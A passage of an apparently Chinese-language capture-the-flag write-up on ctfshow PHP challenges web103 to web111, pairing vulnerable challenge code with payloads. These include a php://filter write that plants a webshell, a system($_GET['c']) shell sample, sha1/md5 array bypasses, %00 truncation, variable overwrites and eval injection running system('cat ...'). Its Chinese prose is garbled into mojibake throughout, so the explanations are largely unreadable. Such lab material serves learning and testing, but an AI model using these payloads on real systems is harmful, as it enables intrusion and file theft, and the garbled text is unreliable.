class="hljs-string">&#x27;v3&#x27;</span>];<br><span class="hljs-variable">$v4</span> = <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v2</span>) <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v3</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$v4</span>)&#123;<br>    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$v2</span>,<span class="hljs-number">2</span>);<br>    <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$v1</span>,<span class="hljs-variable">$s</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$v3</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>çœ‹åˆ°file_put_contentsè¦æ¡ä»¶åå°„ï¼Œå› ä¸ºå®ƒå¯ä»¥é…åˆä¼ªåè®®</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">file_put_contents()</span><br><span class="language-xml">//ç”¨æ¥å†™æ–‡ä»¶è¿›å»ï¼Œå…¶ä¸­æ–‡ä»¶åå‚æ•°æ˜¯æ”¯æŒä¼ªåè®®çš„ï¼Œç”¨äºå°†ç¬¬äºŒä¸ªå‚æ•°contentè¿›è¡Œè¿‡æ»¤å™¨åå†å†™è¿›æ–‡ä»¶é‡Œé¢å»</span><br><span class="language-xml">file_put_content($_POST[&#x27;filename&#x27;], &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;);</span><br></code></pre></td></tr></table></figure><p>é€šè¿‡ä¼ªåè®®ç›´æ¥ç”Ÿæˆæ–‡ä»¶<br><code>?v3=php://filter/write=convert.base64-decode/resource=2.php</code><br>é€šè¿‡åå…­è¿›åˆ¶v2&#x3D;115044383959474e6864434171594473<br>post :v1&#x3D;hex2bin</p><p>ç„¶åå¾—åˆ° PD89YGNhdCAqYDs base64è§£ç ä¸º<code>&lt;?=`cat *`;</code><br>è®¿é—®2.phpæŸ¥çœ‹æºç å³å¯æŸ¥çœ‹åˆ°flag</p><h2 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$v1</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>    <span class="hljs-variable">$v2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$v1</span>)==<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$v2</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>sha1()ä¸MD5ä¸€æ ·éƒ½æ˜¯æœ‰æ¼æ´å¯ä»¥ç»•è¿‡çš„</p><h4 id="sha1æ¼æ´"><a href="#sha1æ¼æ´" class="headerlink" title="sha1æ¼æ´"></a>sha1æ¼æ´</h4><p>ä¾‹å¦‚è¿™ä¸ªä»£ç ï¼š<code>$_GET[&#39;name&#39;]!=$_GET[&#39;password&#39;]&amp;&amp;sha1($_GET[&#39;name&#39;])===sha1($_GET[&#39;password&#39;])</code></p><p>å¯é€šè¿‡æ„é€ <code>?name[]&amp;password[]=123123</code> æ¥ç»•è¿‡<br>GET:?v2[]&#x3D;123123<br>POST:v1[]&#x3D;<br>å¾—å‡ºflag</p><h2 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$error</span>=<span class="hljs-string">&#x27;ä½ è¿˜æƒ³è¦flagå˜›ï¼Ÿ&#x27;</span>;<br><span class="hljs-variable">$suces</span>=<span class="hljs-string">&#x27;æ—¢ç„¶ä½ æƒ³è¦é‚£ç»™ä½ å§ï¼&#x27;</span>;<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$key</span>===<span class="hljs-string">&#x27;error&#x27;</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;what are you doing?!&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$$key</span>=<span class="hljs-variable">$$value</span>;<br>&#125;<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$value</span>===<span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;what are you doing?!&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$$key</span>=<span class="hljs-variable">$$value</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]==<span class="hljs-variable">$flag</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-variable">$error</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;your are good&quot;</span>.<span class="hljs-variable">$flag</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">die</span>(<span class="hljs-variable">$suces</span>); <br></code></pre></td></tr></table></figure><p>é¢˜ç›®ä¸€å…±æœ‰ä¸‰ä¸ªå˜é‡$error $suces $flag æˆ‘ä»¬åªè¦ä»¤å…¶ä¸­ä¸€ä¸ªçš„å€¼ä¸ºflagï¼Œéƒ½æ˜¯å¯ä»¥é€šè¿‡dieæˆ–è€…ç›´æ¥echoè¾“å‡ºçš„<br>é€šè¿‡die($error)è¾“å‡º<br>get:a&#x3D;flag post:error&#x3D;a<br>è¿›è¡Œçš„æ“ä½œä¸º</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-symbol">$a</span>=<span class="hljs-symbol">$flag</span><br><span class="hljs-symbol">$error</span>=<span class="hljs-symbol">$a</span><br></code></pre></td></tr></table></figure><p>æ­¤æ—¶$a&#x3D;flag;$error&#x3D;flag,ä»è€Œè¾“å‡ºerrorä¹Ÿå°±æ˜¯è¾“å‡ºflag</p><h2 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$v1</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>    <span class="hljs-variable">$v2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$v1</span>)==<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$v2</span>) &amp;&amp; <span class="hljs-variable">$v1</span>!=<span class="hljs-variable">$v2</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>æ­¤é¢˜ä¸104é¢˜ç›¸åŒï¼Œåˆ©ç”¨sha1çš„æ¼æ´ï¼Œpost:v1[]&#x3D;<br>get:v2[]&#x3D;123123</p><p>è·å–flag</p><h2 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;v1&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$v1</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>    <span class="hljs-variable">$v3</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>];<br>       <span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$v1</span>,<span class="hljs-variable">$v2</span>);<span class="hljs-comment">//parse_str(string(è§„å®šè¦è§£æçš„å­—ç¬¦ä¸²),array(è§„å®šå­˜å‚¨å˜é‡çš„æ•°ç»„åç§°ã€‚è¯¥å‚æ•°æŒ‡ç¤ºå˜é‡å­˜å‚¨åˆ°æ•°ç»„ä¸­))</span><br>       <span class="hljs-keyword">if</span>(<span class="hljs-variable">$v2</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$v3</span>))&#123;<br>           <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>       &#125;<br><br>&#125; <br></code></pre></td></tr></table></figure><p>çœ‹åˆ°MD5ï¼Œæˆ‘ä»¬é€‰æ‹©æ•°ç»„ç»•è¿‡ï¼Œè®©v1&#x3D;flagï¼Œæˆ‘çš„ç†è§£æ˜¯v2å«äºv1ï¼Œv2[â€˜flagâ€™],æ‰€ä»¥v1è¦åŒ…å«flag<br>payloadï¼š</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable constant_">GET</span><span class="hljs-symbol">:v3[]=</span><span class="hljs-number">122</span><br><span class="hljs-variable constant_">POST</span><span class="hljs-symbol">:v1=flag</span><br><br></code></pre></td></tr></table></figure><h2 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ereg</span> (<span class="hljs-string">&quot;^[a-zA-Z]+$&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>])===<span class="hljs-literal">FALSE</span>)  &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br><br>&#125;<br><span class="hljs-comment">//åªæœ‰36dçš„äººæ‰èƒ½çœ‹åˆ°flag</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))==<span class="hljs-number">0x36d</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>intval()å‡½æ•°ç”¨äºè·å–å˜é‡çš„æ•´æ•°å€¼ã€‚<br>strrev() å‡½æ•°åè½¬å­—ç¬¦ä¸²ã€‚<br>0x36d&#x3D;877<br>ä¸”å‰é¢ifæ˜¯æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ï¼Œåˆ™geté‡Œå¾—æœ‰ä¸€ä¸ªç¬¦åˆæ­£åˆ™åŒ¹é…çš„å­—ç¬¦ï¼Œå³ç¬¬ä¸€ä¸ªè¦ä¸ºå­—æ¯<br>%00ä¸ºæˆªæ–­ä½œç”¨ï¼Œå°±æ˜¯cè¯­è¨€ä¸­å­—ç¬¦ä¸²çš„æˆªæ­¢ç¬¦å·&#x2F;0çš„ä½œç”¨</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">payload:</span><br>?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>a<span class="hljs-variable">%00778</span><br></code></pre></td></tr></table></figure><p>è¿™æ ·å³æ»¡è¶³äº†ç¬¬ä¸€ä¸ªifçš„æ­£åˆ™åŒ¹é…åœ¨%00å¤„åœæ­¢ï¼Œä¹Ÿæ»¡è¶³äº†ç¬¬äºŒä¸ªifåè½¬å¼±æ¯”è¾ƒç­‰äº877åœ¨%00å¤„åœæ­¢ã€‚</p><h2 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$v1</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>    <span class="hljs-variable">$v2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="hljs-variable">$v1</span>) &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="hljs-variable">$v2</span>))&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;echo new <span class="hljs-subst">$v1</span>(<span class="hljs-subst">$v2</span>());&quot;</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>ä»£ç åœ¨æ­¤ï¼Œæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ï¼Œå…³é”®åœ¨äºevalé‡Œçš„å†…å®¹ï¼Œæ„æ€ä¸ºåˆå§‹åŒ–ä¸€ä¸ªv1ç±»ï¼Œv2()æ˜¯ä¼ å…¥è¿™ä¸ªç±»çš„å‚æ•°ï¼Œé‚£ä¹ˆv1å°±æ˜¯ä¸€ä¸ªå†…ç½®ç±»<br>payload:</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">?v1=mysqli<span class="hljs-variable">&amp;v2</span>=<span class="hljs-meta">system</span>(<span class="hljs-string">&#x27;cat fl36dg.txt&#x27;</span>)<br></code></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯åˆå§‹åŒ–ä¸€ä¸ªmysqliç±»ï¼Œä½†æ˜¯å®é™…ä¸Šè¿™ä¸ªç±»çš„åˆå§‹åŒ–æ—¶å€™ä¼ å‚ä¸æ­¢è¿™ä¸€ä¸ªï¼Œæ‰€ä»¥æ˜¯åˆå§‹åŒ–å¤±è´¥çš„ï¼Œä½†æ˜¯ç”±äºå…¶å†…éƒ¨æœ‰é­”æœ¯æ–¹æ³•<code>_toString</code><br>å¦‚æœç±»å®šä¹‰äº†toStringæ–¹æ³•ï¼Œå°±èƒ½åœ¨æµ‹è¯•æ—¶ï¼Œechoæ‰“å°å¯¹è±¡ä½“ï¼Œå¯¹è±¡å°±ä¼šè‡ªåŠ¨è°ƒç”¨å®ƒæ‰€å±ç±»å®šä¹‰çš„toStringæ–¹æ³•ï¼Œæ ¼å¼åŒ–è¾“å‡ºè¿™ä¸ªå¯¹è±¡æ‰€åŒ…å«çš„æ•°æ®ã€‚<br>è¿™æ—¶å€™å°±å¯ä»¥echoå‡ºæ¥äº†ã€‚<br>åŒæ ·<code>Exception</code>ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œè¿™ä¸ªç±»ä¼šæŠŠä¼ å…¥çš„å‚æ•°è¾“å‡ºå‡ºæ¥ï¼Œä¹Ÿæ˜¯<code>_toString</code>æ–¹æ³•çš„ï¼Œæ‰€ä»¥payloadå¦‚ä¸‹ï¼š</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?v1=<span class="hljs-keyword">exception</span>&amp;v2=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat fl36dg.txt&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h2><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">highlight_file(__FILE__);<br>error_reporting(0);<br>if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;<br>    $v1 = $_GET[&#x27;v1&#x27;];<br>    $v2 = $_GET[&#x27;v2&#x27;];<br><br>    if(preg_match(&#x27;/\~|<span class="hljs-string">\`</span>|<span class="hljs-string">\!</span>|<span class="hljs-string">\@</span>|<span class="hljs-string">\#</span>|<span class="hljs-string">\\$</span>|<span class="hljs-string">\%</span>|<span class="hljs-string">\^</span>|<span class="hljs-string">\&amp;</span>|<span class="hljs-string">\*</span>|<span class="hljs-string">\(</span>|<span class="hljs-string">\)</span>|<span class="hljs-string">\_</span>|<span class="hljs-string">\-</span>|<span class="hljs-string">\+</span>|<span class="hljs-string">\=</span>|<span class="hljs-string">\&#123;</span>|<span class="hljs-string">\[</span>|<span class="hljs-string">\;</span>|<span class="hljs-string">\:</span>|<span class="hljs-string">\&quot;</span>|<span class="hljs-string">\&#x27;</span>|<span class="hljs-string">\,</span>|<span class="hljs-string">\.</span>|<span class="hljs-string">\?</span>|<span class="hljs-string">\\\\</span>|<span class="hljs-string">\/</span>|<span class="hljs-string">[0-9]/&#x27;, $v1))&#123;</span><br><span class="hljs-string">            die(&quot;error v1&quot;);</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    if(preg_match(&#x27;/\~</span>|<span class="hljs-string">\`</span>|<span class="hljs-string">\!</span>|<span class="hljs-string">\@</span>|<span class="hljs-string">\#</span>|<span class="hljs-string">\\$</span>|<span class="hljs-string">\%</span>|<span class="hljs-string">\^</span>|<span class="hljs-string">\&amp;</span>|<span class="hljs-string">\*</span>|<span class="hljs-string">\(</span>|<span class="hljs-string">\)</span>|<span class="hljs-string">\_</span>|<span class="hljs-string">\-</span>|<span class="hljs-string">\+</span>|<span class="hljs-string">\=</span>|<span class="hljs-string">\&#123;</span>|<span class="hljs-string">\[</span>|<span class="hljs-string">\;</span>|<span class="hljs-string">\:</span>|<span class="hljs-string">\&quot;</span>|<span class="hljs-string">\&#x27;</span>|<span class="hljs-string">\,</span>|<span class="hljs-string">\.</span>|<span class="hljs-string">\?</span>|<span class="hljs-string">\\\\</span>|<span class="hljs-string">\/</span>|<span class="hljs-string">[0-9]/&#x27;, $v2))&#123;</span><br><span class="hljs-string">            die(&quot;error v2&quot;);</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    eval(&quot;echo new $v1($v2());&quot;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#125; </span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>ä»£ç å¯çŸ¥ï¼Œæ­£åˆ™åŒ¹é…è¿‡æ»¤äº†å‡ ä¹é™¤å­—æ¯å¤–çš„æ‰€æœ‰å­—ç¬¦ï¼Œæ‰€ä»¥web109çš„æ–¹æ³•ä¸å†é€‚ç”¨ï¼Œæ‰¾ä¸€ä¸ªå¯ä»¥ç”¨çš„å†…ç½®ç±»å’Œçº¯å­—æ¯å‡½æ•°<br>ç±»ï¼š<br>FilesystemIterator() éå†æ–‡ä»¶ç±»<br>directoryItrerator() éå†ç›®å½•ç±»<br>å‡½æ•°ï¼š<br>getcwd() è¿”å›å½“å‰å·¥ä½œç›®å½•</p><p>payloadï¼š</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">?<span class="hljs-built_in">v1</span><span class="hljs-symbol">=FilesystemIterator</span>&amp;<span class="hljs-built_in">v2</span><span class="hljs-symbol">=getcwd</span><br></code></pre></td></tr></table></figure><p>å›æ˜¾äº†ä¸€ä¸ªfl36dga.txtæ–‡ä»¶ï¼Œåœ¨urlä¸­è¾“å…¥å³å¯è·å–flag</p><h2 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h2><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">highlight_file(__FILE__);<br>error_reporting(0);<br>include(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br>function getFlag(&amp;$v1,&amp;$v2)&#123;<br>    eval(<span class="hljs-string">&quot;$$v1 = &amp;$$v2;&quot;</span>);<br>    var_dump($$v1);<br>&#125;<br>if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;<br>    $v1 = $_GET[&#x27;v1&#x27;];<br>    $v2 = $_GET[&#x27;v2&#x27;];<br><br>    if(preg_match(&#x27;/\~|<span class="hljs-string"> </span>|<span class="hljs-string">\`</span>|<span class="hljs-string">\!</span>|<span class="hljs-string">\@</span>|<span class="hljs-string">\#</span>|<span class="hljs-string">\\$</span>|<span class="hljs-string">\%</span>|<span class="hljs-string">\^</span>|<span class="hljs-string">\&amp;</span>|<span class="hljs-string">\*</span>|<span class="hljs-string">\(</span>|<span class="hljs-string">\)</span>|<span class="hljs-string">\_</span>|<span class="hljs-string">\-</span>|<span class="hljs-string">\+</span>|<span class="hljs-string">\=</span>|<span class="hljs-string">\&#123;</span>|<span class="hljs-string">\[</span>|<span class="hljs-string">\;</span>|<span class="hljs-string">\:</span>|<span class="hljs-string">\&quot;</span>|<span class="hljs-string">\&#x27;</span>|<span class="hljs-string">\,</span>|<span class="hljs-string">\.</span>|<span class="hljs-string">\?</span>|<span class="hljs-string">\\\\</span>|<span class="hljs-string">\/</span>|<span class="hljs-string">[0-9]</span>|<span class="hljs-string">\&lt;</span>|<span class="hljs-string">\&gt;/&#x27;, $v1))&#123;</span><br><span class="hljs-string">            die(&quot;error v1&quot;);</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    if(preg_match(&#x27;/\~</span>|<span class="hljs-string"> </span>|<span class="hljs-string">\`</span>|<span class="hljs-string">\!</span>|<span class="hljs-string">\@</span>|<span class="hljs-string">\#</span>|<span class="hljs-string">\\$</span>|<span class="hljs-string">\%</span>|<span class="hljs-string">\^</span>|<span class="hljs-string">\&amp;</span>|<span class="hljs-string">\*</span>|<span class="hljs-string">\(</span>|<span class="hljs-string">\)</span>|<span class="hljs-string">\_</span>|<span class="hljs-string">\-</span>|<span class="hljs-string">\+</span>|<span class="hljs-string">\=</span>|<span class="hljs-string">\&#123;</span>|<span class="hljs-string">\[</span>|<span class="hljs-string">\;</span>|<span class="hljs-string">\:</span>|<span class="hljs-string">\&quot;</span>|<span class="hljs-string">\&#x27;</span>|<span class="hljs-string">\,</span>|<span class="hljs-string">\.</span>|<span class="hljs-string">\?</span>|<span class="hljs-string">\\\\</span>|<span class="hljs-string">\/</span>|<span class="hljs-string">[0-9]</span>|<span class="hljs-string">\&lt;</span>|<span class="hljs-string">\&gt;/&#x27;, $v2))&#123;</span><br><span class="hljs-string">            die(&quot;error v2&quot;);</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    if(preg_match(&#x27;/ctfshow/&#x27;, $v1))&#123;</span><br><span class="hljs-string">            getFlag($v1,$v2);</span><br><span class="hljs-string">    &#125; </span><br></code></pre></td></tr></table></figure><p>åŒæ ·çš„v1&amp;v2åªèƒ½è¾“å…¥å­—æ¯ï¼Œæœ€ä¸‹é¢çš„æ­£åˆ™åŒ¹é…è¡¨ç¤ºv1&#x3D;ctfshowï¼Œ<br>getflagä¸­&amp;ç¬¦å·ä¸cè¯­è¨€æŒ‡é’ˆä¸€æ ·ï¼Œåœ¨evalä¸­<code>$$v1=&amp;$$v2</code>è¡¨ç¤ºä¸ºå˜é‡è¦†ç›–<br>payload:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">v1</span>=ctfshow&amp;v2=flag<br></code></pre></td></tr></table></figure><p>å›æ˜¾ä¸ºNULLï¼Œå› ä¸ºgetflagé‡Œä¸ºå±€éƒ¨å˜é‡ï¼Œæ— 